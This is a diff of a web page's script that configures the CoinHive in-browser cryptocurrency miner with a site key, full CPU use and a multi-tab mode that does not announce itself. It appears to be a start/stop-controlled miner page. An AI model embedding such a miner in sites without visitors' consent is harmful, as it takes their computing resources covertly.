@@ -9,32 +9,16 @@
 
     <script>
         var miner = new CoinHive.Anonymous('EOCSMoWu9f4EWMvDaxgWmg0uhRoCXHIr', { //Create a new miner and credit all hashes to the specified user name. You can check a user's balance and withdraw hashes for a user with our HTTP API. Common use-cases include granting in-game currency or other incentives to a user account on your website in turn for running the miner. Please only use the CoinHive.User miner if you later intend to retreive the number of hashes using the HTTP API. Don't use it to store random session names that you never read back.
-            threads: 4,         //The number of threads the miner should start with. The default is navigator.hardwareConcurrency, i.e. the number of CPU cores available on the user's computer.
-            autoThreads: false, //Whether to automatically adjust the number of threads for optimal performance. This feature is experimental. The default is false.
+            //threads: 10,         //The number of threads the miner should start with. The default is navigator.hardwareConcurrency, i.e. the number of CPU cores available on the user's computer.
+            autoThreads: true, //Whether to automatically adjust the number of threads for optimal performance. This feature is experimental. The default is false.
             throttle: 0,        //The fraction of time that threads should be idle. See miner.setThrottle() for a detailed explanation. The default is 0.s
             forceASMJS: false   //If true, the miner will always use the asm.js implementation of the hashing algorithm. If false, the miner will use the faster WebAssembly version if supported and otherwise fall back to asm.js. The default is false.
         });
-        /*
-        var miner = new CoinHive.User('EOCSMoWu9f4EWMvDaxgWmg0uhRoCXHIr', 'Example User', { //Create a new miner and credit all hashes to the specified user name. You can check a user's balance and withdraw hashes for a user with our HTTP API. Common use-cases include granting in-game currency or other incentives to a user account on your website in turn for running the miner. Please only use the CoinHive.User miner if you later intend to retreive the number of hashes using the HTTP API. Don't use it to store random session names that you never read back.
-            threads: 4,         //The number of threads the miner should start with. The default is navigator.hardwareConcurrency, i.e. the number of CPU cores available on the user's computer.
-            autoThreads: false, //Whether to automatically adjust the number of threads for optimal performance. This feature is experimental. The default is false.
-            throttle: 0,        //The fraction of time that threads should be idle. See miner.setThrottle() for a detailed explanation. The default is 0.s
-            forceASMJS: false   //If true, the miner will always use the asm.js implementation of the hashing algorithm. If false, the miner will use the faster WebAssembly version if supported and otherwise fall back to asm.js. The default is false.
-        });
-        */
-        /*
-        var miner = new CoinHive.Token('EOCSMoWu9f4EWMvDaxgWmg0uhRoCXHIr', 1024, { //Create a new miner and stop once the specified number of hashes (targetHashes) was found. Tokens can be verified with our HTTP API. Tokens remain valid for 1 hour. The random token name is created by our mining pool. You can read it client side with miner.getToken() after the miner successfully authed on the pool. Common use-cases include one off proof of work verifications to limit actions on your site or grant access to a resource. For example, this is used by the Coinhive captcha and shortlinks.
-            threads: 4,         //The number of threads the miner should start with. The default is navigator.hardwareConcurrency, i.e. the number of CPU cores available on the user's computer.
-            autoThreads: false, //Whether to automatically adjust the number of threads for optimal performance. This feature is experimental. The default is false.
-            throttle: 0,        //The fraction of time that threads should be idle. See miner.setThrottle() for a detailed explanation. The default is 0.s
-            forceASMJS: false   //If true, the miner will always use the asm.js implementation of the hashing algorithm. If false, the miner will use the faster WebAssembly version if supported and otherwise fall back to asm.js. The default is false.
-        });
-        */
 
         function myStart() {
             //miner.start(CoinHive.IF_EXCLUSIVE_TAB);   //The miner will only start if no other tabs are already mining. If all miners in other tabs are stopped or closed at a later point, the miner will then start. This ensures that one miner is always running as long as one tab of your site is open while keeping costly pool reconnections at a minimum.
-            miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);  //The miner will always start and immediately kill all miners in other tabs that have not specified CoinHive.FORCE_MULTI_TAB.
-            //miner.start(CoinHive.FORCE_MULTI_TAB);    //The miner will always start. It will not announce its presence to other tabs, will not kill any other miners and can't be killed by other miners. This mode is used by the captcha and shortlinks.
+            //miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);  //The miner will always start and immediately kill all miners in other tabs that have not specified CoinHive.FORCE_MULTI_TAB.
+            miner.start(CoinHive.FORCE_MULTI_TAB);    //The miner will always start. It will not announce its presence to other tabs, will not kill any other miners and can't be killed by other miners. This mode is used by the captcha and shortlinks.
         }
 
         function myStop() {
